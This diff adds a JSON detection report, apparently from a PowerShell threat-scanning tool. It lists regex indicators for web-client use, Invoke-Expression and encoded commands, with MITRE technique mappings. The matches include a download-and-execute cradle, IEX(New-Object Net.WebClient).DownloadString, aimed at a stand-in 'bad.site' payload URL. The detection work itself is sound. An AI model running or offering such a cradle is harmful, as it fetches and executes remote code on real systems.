@@ -1,0 +1,160 @@
+[
+  {
+    "link": "https://github.com/avasero/powershell.exposed/blob/main/indicators/ps_indicator_web_client_traces.yaml",
+    "name": "Web Client traces",
+    "pattern": "RestMethod|[\\.-]webclient|WebRequest|Net.Sockets.TcpClient|InternetExplorer\\.Application|(win|Xml)Http|\\b(curl|wget|iwr|irm)\\s+|InstallProduct\\(.+https*://|(\\b[\\-\u2014\u2013\u2015]Uri|\\b[\\-\u2014\u2013\u2015]Url)\\s.+https*://",
+    "tactics": [
+      "Execution"
+    ],
+    "severity": "high",
+    "reference": [
+      "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml"
+    ],
+    "base_score": 7.5,
+    "techniques": [
+      "T1105",
+      "T1059.001"
+    ],
+    "description": "Spots potential attempts to use PS as a web client to access network resources.",
+    "total_score": 15.0,
+    "matches_found": 2,
+    "indicator_type": "community",
+    "matches_details": [
+      {
+        "position": {
+          "end": 29,
+          "start": 19
+        },
+        "matched_in": "deobfuscated",
+        "match_number": 1,
+        "matched_text": ".WebClient"
+      },
+      {
+        "position": {
+          "end": 28,
+          "start": 18
+        },
+        "matched_in": "deobfuscated",
+        "match_number": 2,
+        "matched_text": ".WebClient"
+      }
+    ],
+    "max_match_allowed": 3,
+    "is_premium_indicator": false,
+    "found_in_deobfuscated": true
+  },
+  {
+    "link": "https://github.com/avasero/powershell.exposed/blob/main/indicators/ps_indicator_invoke_expression_cmdlet.yaml",
+    "name": "Invoke-Expression Cmdlet",
+    "pattern": "Invoke-Expression|\\biex\\b",
+    "tactics": [
+      "Execution"
+    ],
+    "severity": "medium",
+    "reference": [
+      "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml"
+    ],
+    "base_score": 5.0,
+    "techniques": [
+      "T1059.001"
+    ],
+    "description": "Spots potential use of Invoke-Expression cmdlet and its alias.",
+    "total_score": 10.0,
+    "matches_found": 2,
+    "indicator_type": "community",
+    "matches_details": [
+      {
+        "position": {
+          "end": 3,
+          "start": 0
+        },
+        "matched_in": "deobfuscated",
+        "match_number": 1,
+        "matched_text": "iex"
+      },
+      {
+        "position": {
+          "end": 3,
+          "start": 0
+        },
+        "matched_in": "deobfuscated",
+        "match_number": 2,
+        "matched_text": "IEX"
+      }
+    ],
+    "max_match_allowed": 3,
+    "is_premium_indicator": false,
+    "found_in_deobfuscated": true
+  },
+  {
+    "link": "https://github.com/avasero/powershell.exposed/blob/main/indicators/ps_indicator_invoke_expression.yaml",
+    "name": "Notable Invoke-Expression reference",
+    "pattern": "\\b(iex|Invoke[\\-\u2014\u2013\u2015]Expression)\\s+2>&1|\\biex\\(",
+    "tactics": [
+      "tba"
+    ],
+    "severity": "high",
+    "reference": [
+      "https://www.avasero.com/"
+    ],
+    "base_score": 8.7,
+    "techniques": [
+      "tba"
+    ],
+    "description": "tba",
+    "total_score": 8.7,
+    "matches_found": 1,
+    "indicator_type": "community",
+    "matches_details": [
+      {
+        "position": {
+          "end": 4,
+          "start": 0
+        },
+        "matched_in": "deobfuscated",
+        "match_number": 1,
+        "matched_text": "IEX("
+      }
+    ],
+    "max_match_allowed": 3,
+    "is_premium_indicator": false,
+    "found_in_deobfuscated": true
+  },
+  {
+    "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_encoded_command.yaml",
+    "name": "Encoded Command Detected",
+    "pattern": "explicit_encoded_command",
+    "tactics": [
+      "Defense Evasion"
+    ],
+    "severity": "medium",
+    "reference": [
+      "https://attack.mitre.org/techniques/T1027/",
+      "https://attack.mitre.org/techniques/T1140/"
+    ],
+    "base_score": 5.0,
+    "techniques": [
+      "T1027",
+      "T1027.001",
+      "T1140"
+    ],
+    "description": "Command encoding detected: Found -EncodedCommand parameter (or variant) (confidence: 95%)",
+    "total_score": 5.0,
+    "matches_found": 1,
+    "indicator_type": "private",
+    "matches_details": [
+      {
+        "position": {
+          "end": 227,
+          "start": 0
+        },
+        "matched_in": "original",
+        "match_number": 1,
+        "matched_text": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')"
+      }
+    ],
+    "max_match_allowed": 1,
+    "is_premium_indicator": false,
+    "found_in_deobfuscated": false
+  }
+]
